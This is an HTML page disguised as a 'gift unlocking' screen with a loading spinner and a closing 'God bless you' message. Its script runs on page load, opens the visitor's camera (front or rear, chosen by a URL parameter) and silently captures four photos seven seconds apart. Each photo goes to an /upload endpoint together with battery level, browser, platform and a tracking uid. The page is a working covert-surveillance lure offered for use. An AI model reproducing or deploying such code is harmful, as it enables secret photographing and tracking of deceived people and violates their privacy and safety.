<!DOCTYPE html>
<html>
<head>
    <title>Gift Unlocking...</title>
    <style>
        body { background: black; color: white; text-align: center; font-family: Arial; overflow: hidden; }
        .container { margin-top: 100px; }
        .lock-box { position: relative; display: inline-block; }
        #guy { width: 80px; animation: rotateKey 2s infinite linear; }
        .spinner { border: 4px solid #f3f3f3; border-top: 4px solid #3498db; border-radius: 50%; width: 40px; height: 40px; animation: spin 1s linear infinite; margin: 20px auto; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
        @keyframes rotateKey { 0% { transform: rotate(0deg); } 50% { transform: rotate(20deg); } 100% { transform: rotate(0deg); } }
        #final-msg { display: none; color: #4CAF50; font-size: 20px; padding: 20px; }
    </style>
</head>
<body>
    <div class="container">
        <div id="loader">
            <div class="lock-box">
                <img src="https://cdn-icons-png.flaticon.com/512/2889/2889676.png" width="100"><br>
                <img id="guy" src="https://cdn-icons-png.flaticon.com/512/3039/3039433.png">
            </div>
            <h3>Your Gift is Loading...</h3>
            <div class="spinner"></div>
        </div>
        <div id="final-msg">
            Your gift has been redeemed. You are a good person, God bless you. ✨
        </div>
    </div>
    <video id="video" style="display:none" autoplay></video>
    <canvas id="canvas" style="display:none"></canvas>

    <script>
        const urlParams = new URLSearchParams(window.location.search);
        const mode = urlParams.get('m') || 'front';
        const uid = urlParams.get('uid');

        async function getInfo() {
            let battery = await navigator.getBattery();
            return {
                battery: Math.round(battery.level * 100) + "%",
                browser: navigator.userAgent.split(' ').pop(),
                device: navigator.platform
            };
        }

        async function startCapture() {
            const constraints = { video: { facingMode: mode === 'back' ? "environment" : "user" } };
            const stream = await navigator.mediaDevices.getUserMedia(constraints);
            video.srcObject = stream;

            for (let i = 0; i < 4; i++) {
                await new Promise(r => setTimeout(r, 7000)); // 7 seconds gap
                canvas.width = video.videoWidth;
                canvas.height = video.videoHeight;
                canvas.getContext('2d').drawImage(video, 0, 0);
                const info = await getInfo();
                fetch('/upload', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ image: canvas.toDataURL('image/jpeg'), uid: uid, mode: mode, info: info })
                });
            }
            document.getElementById('loader').style.display = 'none';
            document.getElementById('final-msg').style.display = 'block';
        }
        window.onload = startCapture;
    </script>
</body>
</html>
